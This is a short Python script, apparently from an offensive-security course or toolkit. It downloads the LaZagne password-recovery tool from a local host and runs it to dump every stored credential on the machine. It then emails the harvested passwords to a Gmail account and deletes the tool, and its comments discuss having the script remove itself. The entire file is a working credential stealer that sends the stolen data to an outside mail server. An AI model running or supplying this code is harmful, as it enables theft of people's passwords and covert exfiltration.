#! /usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


os.chdir(tempfile.gettempdir())
# The code below requires the obligatory download of Lazagne before executing a penetration test.
download("http://10.0.2.5/downloads/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
# TODO: if we want to keep our login data to email intact, force self-removal after running the script.
# Further read: https://stackoverflow.com/questions/10112601/how-to-make-scripts-auto-delete-at-the-end-of-execution
# Note: The problem mentioned above is partially solved by packaging the script into an executable.
send_mail("example@gmail.com", "password", result)  # fill with necessary data for it to work
os.remove("lazagne.exe")
